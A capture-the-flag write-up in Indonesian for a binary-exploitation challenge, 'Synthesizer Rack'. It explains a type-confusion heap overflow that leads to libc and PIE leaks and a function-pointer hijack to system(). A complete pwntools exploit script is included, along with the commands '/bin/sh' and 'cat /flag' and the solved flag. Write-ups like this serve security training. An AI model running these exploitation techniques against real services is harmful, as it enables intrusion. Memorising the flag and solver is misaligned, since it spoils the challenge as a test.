# 6. Synthesizer Rack

**Kategori:** Pwn / Binary Exploitation  
**Target:** `nc cyberleague-shared-nlb-8eebe09f116ebe55.elb.ap-southeast-1.amazonaws.com 30004`  
**Flag format:** `CYBERLEAGUE{...}`



## Deskripsi

Synthesizer Rack memiliki beberapa jenis module: oscillator, filter, envelope, dan LFO. Menu `Repatch module` memungkinkan satu object dialihkan ke type lain tanpa mengubah layout memory object lama.

Ini menghasilkan **Type Confusion** yang menjadi primitive utama.

## 6.1 Proteksi

```text
PIE
NX
Stack Canary
Full RELRO
```

Walaupun mitigasi aktif, heap corruption dan function pointer hijacking tetap dapat dilakukan.

## 6.2 Type Confusion

Bug berada pada menu `7`.

Secara konseptual:

```text
module_types[slot] = NEW_TYPE
```

namun object di heap tidak direalokasi ke struktur baru.

Jika object oscillator dipandang sebagai LFO, field tertentu memiliki offset yang sama tetapi semantik berbeda.

Field yang dimanfaatkan:

```text
LFO.max       @ +0x30
OSC.buf_size  @ +0x30
```

Dengan demikian kita dapat memanipulasi `buf_size` melalui editor LFO.

## 6.3 Membuat `buf_size = 0x60`

Nilai floating point berikut digunakan:

```text
0x0.000000000006p-1022
```

dengan target nilai internal yang dibutuhkan sekitar:

```text
0x60 = 96
```

## 6.4 Heap Overflow

Menu `8` menulis sample ke oscillator menggunakan `read_exact()`.

Buffer awal hanya 16 byte, tetapi setelah type confusion `buf_size` menjadi `0x60`.

Akibatnya:

```text
read_exact(A->buf, 0x60)
```

menulis melewati boundary buffer A dan masuk ke object B yang berdekatan.

Offset yang dimanfaatkan:

```text
A.buf → B object       +0x20
A.buf → B.buf_size     +0x50
A.buf → B.buf          +0x58
```

## 6.5 Arbitrary Read

Object B dikorupsi menjadi:

```text
B.buf_size = 8
B.buf      = puts@GOT
```

Kemudian menu `9` (`Record module`) digunakan untuk membaca 8 byte dari `puts@GOT`.

Leak tersebut memberi:

```text
puts@libc
```

dan kemudian libc base:

```text
libc_base = puts_leak - puts_offset
```

Pada glibc Ubuntu Noble yang digunakan pada sesi:

```text
puts offset   = 0x87cc0
system offset = 0x58750
```

## 6.6 PIE Leak

Menu `11` (`Module info`) membocorkan pointer code seperti `noop_preprocess` atau `cmd_preprocessor`.

PIE base dihitung dengan:

```text
pie = leak - known_symbol_offset
```

## 6.7 Arbitrary Write

Primitive overflow diulang.

Kali ini:

```text
B.buf = &cmd_preprocessor
B.buf_size = 8
```

Lalu alamat `system()` ditulis ke function pointer `cmd_preprocessor`.

Akhirnya ketika preprocessor dipanggil, target secara efektif menjalankan:

```c
system(command);
```

Payload command dapat berupa:

```text
/bin/sh
```

atau command langsung:

```text
cat /flag
```

## 6.8 Struktur Exploit

```text
Create adjacent objects
        ↓
Type confusion
        ↓
Forge buf_size = 0x60
        ↓
Heap OOB write
        ↓
B.buf = puts@GOT
        ↓
Arbitrary read
        ↓
Leak libc
        ↓
B.buf = cmd_preprocessor
        ↓
Write system()
        ↓
Function pointer hijack
        ↓
RCE
```

## 6.9 Solver Inti

Berikut bentuk solver yang mengikuti struktur final solver pada sesi:

```python
#!/usr/bin/env python3
from pwn import *
import os
import re

context.arch = "amd64"
context.log_level = "info"

HOST = "cyberleague-shared-nlb-8eebe09f116ebe55.elb.ap-southeast-1.amazonaws.com"
PORT = 30004
BIN = os.getenv("BIN", "./dist/chall")

elf = context.binary = ELF(BIN, checksec=False)
PROMPT = b"> "


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)


def add_osc(io, freq=1000, waveform=b"A" * 32,
            amp=b"0.5", buf_size=16):
    io.sendline(b"1")
    io.recvuntil(b"Frequency (Hz): ")
    io.sendline(str(freq).encode())
    io.recvuntil(b"Waveform (up to 32 bytes): ")
    io.send(waveform)
    io.recvuntil(b"Amplitude (0.0-1.0): ")
    io.sendline(amp)
    io.recvuntil(b"Output buffer size in bytes (16-1024): ")
    io.sendline(str(buf_size).encode())
    io.recvuntil(PROMPT)


def module_info(io, slot):
    io.sendline(b"11")
    io.recvuntil(b"Slot to inspect (0-7): ")
    io.sendline(str(slot).encode())
    return io.recvuntil(PROMPT)


def repatch(io, slot, new_type):
    io.sendline(b"7")
    io.recvuntil(b"Slot to repatch (0-7): ")
    io.sendline(str(slot).encode())
    io.recvuntil(b"New type (1=osc 2=filter 3=env 4=lfo): ")
    io.sendline(str(new_type).encode())
    io.recvuntil(PROMPT)


def edit_lfo(io, slot, max_value):
    io.sendline(b"6")
    io.recvuntil(b"Slot to edit (0-7): ")
    io.sendline(str(slot).encode())
    io.recvuntil(b"New rate (mHz): ")
    io.sendline(b"1000")
    io.recvuntil(b"New depth: ")
    io.sendline(b"0.5")
    io.recvuntil(b"New phase: ")
    io.sendline(b"0.0")
    io.recvuntil(b"New shape: ")
    io.sendline(b"1")
    io.recvuntil(b"New sync: ")
    io.sendline(b"0")
    io.recvuntil(b"New modulation tag: ")
    io.sendline(b"0")
    io.recvuntil(b"New min value: ")
    io.sendline(b"0.0")
    io.recvuntil(b"New max value: ")
    io.sendline(max_value.encode())
    io.recvuntil(PROMPT)


def write_samples(io, slot, payload):
    io.sendline(b"8")
    io.recvuntil(b"Slot to play (0-7): ")
    io.sendline(str(slot).encode())
    io.recvuntil(b"Enter ")
    n = int(io.recvuntil(b" bytes of samples: ", drop=True))
    assert n == len(payload)
    io.send(payload)
    return io.recvuntil(PROMPT)


def read_samples(io, slot):
    io.sendline(b"9")
    io.recvuntil(b"Slot to record (0-7): ")
    io.sendline(str(slot).encode())
    out = io.recvuntil(PROMPT)

    m = re.search(
        rb"Recorded samples \(hex\): ([0-9a-f]+)",
        out,
    )
    assert m, out
    return bytes.fromhex(m.group(1).decode())


def main():
    io = start()
    io.recvuntil(PROMPT)

    # Heap grooming
    add_osc(io, buf_size=16)
    add_osc(io, buf_size=16)

    # PIE leak
    info = module_info(io, 0)
    m = re.search(
        rb"Signal chain processor: (0x[0-9a-f]+)",
        info,
    )
    assert m, info

    leak = int(m.group(1), 16)
    elf.address = leak - elf.sym["noop_preprocess"]

    puts_got = elf.got["puts"]
    cmd_pre = elf.sym["cmd_preprocessor"]

    # Type confusion → buf_size = 0x60
    repatch(io, 0, 4)
    edit_lfo(io, 0, "0x0.000000000006p-1022")
    repatch(io, 0, 1)

    # Corrupt object B
    payload = bytearray(b"X" * 0x60)
    payload[0x20:0x24] = p32(1)
    payload[0x50:0x58] = p64(8)
    payload[0x58:0x60] = p64(puts_got)
    write_samples(io, 0, bytes(payload))

    puts_leak = u64(read_samples(io, 1).ljust(8, b"\x00"))
    log.success(f"puts@libc = {hex(puts_leak)}")

    libc = ELF("./libc.so.6", checksec=False)
    libc.address = puts_leak - libc.sym["puts"]
    system = libc.sym["system"]

    # Corrupt B again so B.buf points to cmd_preprocessor
    payload = bytearray(b"Y" * 0x60)
    payload[0x20:0x24] = p32(1)
    payload[0x50:0x58] = p64(8)
    payload[0x58:0x60] = p64(cmd_pre)
    write_samples(io, 0, bytes(payload))

    # Write system pointer
    write_samples(io, 1, p64(system))

    # Trigger
    io.sendline(b"/bin/sh")
    io.interactive()


if __name__ == "__main__":
    main()
```

> **Catatan solver:** versi final pada sesi memakai beberapa helper tambahan dan penanganan libc yang lebih spesifik. Potongan di atas mempertahankan primitive exploit yang menentukan keberhasilan.

## 6.10 Verifikasi

Shell diperoleh dan kemudian `cat /flag` menampilkan:

```text
CYBERLEAGUE{4ll_h4rd3n3d_st1ll_c0nfus3d}
```

## Flag

```text
CYBERLEAGUE{4ll_h4rd3n3d_st1ll_c0nfus3d}
```

---
